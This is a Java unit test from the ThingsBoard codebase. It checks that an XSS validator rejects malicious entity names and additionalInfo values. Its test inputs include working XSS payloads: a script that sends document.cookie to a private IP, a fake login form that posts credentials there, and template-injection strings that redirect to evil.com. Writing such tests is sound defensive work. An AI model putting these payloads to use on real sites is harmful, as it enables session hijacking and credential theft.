// SPDX-FileCopyrightText: Copyright The ThingsBoard Authors
// SPDX-FileCopyrightText: Modifications Copyright ThingsBoard, Inc.
// SPDX-License-Identifier: Apache-2.0 AND BUSL-1.1
package org.thingsboard.server.dao.service;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.node.TextNode;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;
import org.thingsboard.common.util.JacksonUtil;
import org.thingsboard.server.common.data.asset.Asset;
import org.thingsboard.server.common.data.converter.Converter;
import org.thingsboard.server.common.data.group.EntityGroup;
import org.thingsboard.server.common.data.integration.Integration;

import static org.assertj.core.api.Assertions.assertThatThrownBy;

public class NoXssValidatorTest {

    @ParameterizedTest
    @ValueSource(strings = {
            "aboba<a href='a' onmouseover=alert(1337) style='font-size:500px'>666",
            "9090<body onload=alert('xsssss')>90909",
            "qwerty<script>new Image().src=\"http://192.168.149.128/bogus.php?output=\"+document.cookie;</script>yyy",
            "bambam<script>alert(document.cookie)</script>",
            "<p><a href=\"http://htmlbook.ru/example/knob.html\">Link!!!</a></p>1221",
            "<h3>Please log in to proceed</h3> <form action=http://192.168.149.128>Username:<br><input type=\"username\" name=\"username\"></br>Password:<br><input type=\"password\" name=\"password\"></br><br><input type=\"submit\" value=\"Log in\"></br>",
            "   <img src= \"http://site.com/\"  >  ",
            "123 <input type=text value=a onfocus=alert(1337) AUTOFOCUS>bebe",
            "{{constructor.constructor('location.href=\"https://evil.com\"')()}}",
            "    {{constructor.constructor('alert(1)')()}}",
            "{{}}",
            "{{{constructor.constructor('location.href=\"https://evil.com\"')()}}}",
            "test {{constructor.constructor('location.href=\"https://evil.com\"')()}} test",
            "{{#if user}}Hello, {{user.name}}{{/if}}",
            "{{ user.name }}"
    })
    public void givenEntityWithMaliciousPropertyValue_thenReturnValidationError(String maliciousString) {
        Asset invalidAsset = new Asset();
        invalidAsset.setName(maliciousString);

        assertThatThrownBy(() -> {
            ConstraintValidator.validateFields(invalidAsset);
        }).hasMessageContaining("is malformed");
    }

    @Test
    public void givenEntityWithMaliciousValueInAdditionalInfo_thenReturnValidationError() {
        String maliciousValue = "qwerty<script>alert(document.cookie)</script>qwerty";
        JsonNode description = JacksonUtil.newObjectNode()
                .set("description", new TextNode(maliciousValue));

        Asset invalidAsset = new Asset();
        invalidAsset.setAdditionalInfo(description);
        assetEntityFieldIsMalformed(invalidAsset);

        EntityGroup invalidEntityGroup = new EntityGroup();
        invalidEntityGroup.setAdditionalInfo(description);
        assetEntityFieldIsMalformed(invalidEntityGroup);

        Converter invalidConverter = new Converter();
        invalidConverter.setAdditionalInfo(description);
        assetEntityFieldIsMalformed(invalidConverter);

        Integration invalidIntegration = new Integration();
        invalidIntegration.setAdditionalInfo(description);
        assetEntityFieldIsMalformed(invalidIntegration);
    }

    private void assetEntityFieldIsMalformed(Object data) {
        assertThatThrownBy(() -> {
            ConstraintValidator.validateFields(data);
        }).hasMessageContaining("is malformed");
    }

}
